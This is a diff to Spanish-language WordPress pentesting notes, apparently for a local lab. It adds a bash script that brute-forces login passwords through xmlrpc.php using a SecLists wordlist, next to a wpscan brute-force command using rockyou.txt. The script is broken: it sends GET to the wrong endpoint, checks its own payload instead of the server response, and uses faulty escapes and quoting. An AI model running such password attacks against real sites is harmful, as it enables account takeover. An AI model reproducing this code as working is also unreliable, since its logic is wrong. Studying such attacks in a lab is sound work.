@@ -44,6 +44,40 @@ Hay una forma de ennumerar usuarios a traves de un archivo:
 `xmlrpc.php` si esta expuesto chau
 `curl -s -X POST 'http://localhost:31337/xmlrpc.php' -d@file.xml`
 
+```bash
+#!/bin/bash
+
+function ctrl_c(){
+	echo -e "/nSaliendo/n/n"
+	exit 1
+}
+
+trap ctrl_c SIGINT
+
+function createXML(){
+	passwd=$1
+	textXML="""
+	codigo xml malicioso
+	codigo
+	codigo
+	$passwd
+	codigo
+	"""
+	echo $textXML > file.xml
+	
+	response=$(curl -s -X GET https://localhost:31337/wp-admin.php -d@file.xml)
+	
+	if [ ! "$(echo "$textXML" | grep 'Invalid password')" ]; then
+		echo -e "La contrasenia valida es $passwd"
+		exit 0
+	fi
+}
+
+cat /usr/share/SecList/Passwords.txt | while read password; do
+	createXML $password
+done
+
+```
 ## Fuerza bruta
 `wpscan --url https://127.0.0.1:31337 -U savitar -P usr/share/wordlist/rockyou.txt`
-``
+
